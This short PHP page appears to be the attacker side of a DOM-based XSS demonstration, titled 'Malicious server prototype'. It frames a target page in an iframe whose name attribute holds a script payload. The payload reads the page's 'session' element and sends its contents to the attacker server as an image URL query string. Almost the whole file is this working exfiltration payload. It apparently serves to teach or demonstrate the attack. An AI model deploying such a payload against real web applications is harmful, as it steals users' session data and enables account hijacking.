<?php
include('../declare.php');

$title = "Malicious server prototype: DOM-based XSS";
include('../inc/header.php');
?>
<h1>DOM-based XSS</h1>
<iframe id="embedder" name="dummy<script>var d=document;var e=d.getElementById('session');var i=d.createElement('img');i.src='<?=MALROOT?>images/attack.png?'+encodeURIComponent(e.textContent);e.appendChild(i);</script>" width="400" height="400" src="<?=TGTROOT?>dombased/target"></iframe>
<?
$links = array(
  'dom-based XSS start' => TGTROOT."dombased/start",
);
include('../inc/footer.php');
?>
